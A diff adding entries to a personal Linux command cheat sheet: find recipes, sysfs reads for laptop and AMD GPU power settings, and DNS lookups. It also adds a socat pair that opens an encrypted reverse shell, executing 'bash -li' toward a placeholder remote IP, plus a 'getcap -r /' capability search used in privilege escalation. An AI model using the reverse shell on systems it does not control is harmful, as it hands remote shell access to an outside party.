@@ -6,12 +6,45 @@ ps ux | awk '{ if ($8 == "Z+") print }' | awk '{ print $2 }'
 # Find parent process of zombie process
 ps -o ppid -p <child_id>
 
+# Find files modified in the last 90 minutes
+find . -type f -mmin -90
+
+# Find files older than two days
+find . -type f -mtime +2
+
+# Change permissions of all files
+find . -type f -exec chmod <perm> {} +
+
+# Find all text files containing a specific word
+find . -type f -name "*.txt" -exec grep -iHn 'foo' {} +
+
 # Find active CPU scaling governor
 cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor
 
 # Find active I/O scheduler
 cat <disk>/queue/scheduler
 
+# Check if IdeaPad conservative mode is enabled
+cat /sys/bus/platform/drivers/ideapad_acpi/VPC2004\:00/conservation_mode
+
+# Find AMDGPU power state
+cat /sys/class/drm/<card>/device/power_dpm_state
+
+# Find AMDGPU performance level
+cat /sys/class/drm/<card>/device/power_dpm_force_performance_level
+
+# Start an encrypted TCP socat listener
+socat OPENSSL-LISTEN:<port>,verify=0 FILE:`tty`,raw,echo=0
+
+# Connect to an encrypted socat listener
+socat OPENSSL:<REMOTE_IP>:<REMOTE_PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+# Get globally available capabilities
+getcap -r / 2>/dev/null
+
+# Query domain DNS records
+nslookup -querytype=any <domain> <domain_ip>
 
 $ child_id: ps ux | awk '{ if ($8 == "Z+") print $2, $11 }' --- --map "awk '{ print $1 }'"
 $ disk: find /sys/block -name "nvme*" -o -name "sd*"
+$ card: ls /sys/class/drm | grep -oE "card[0-9]+" | head -n 1
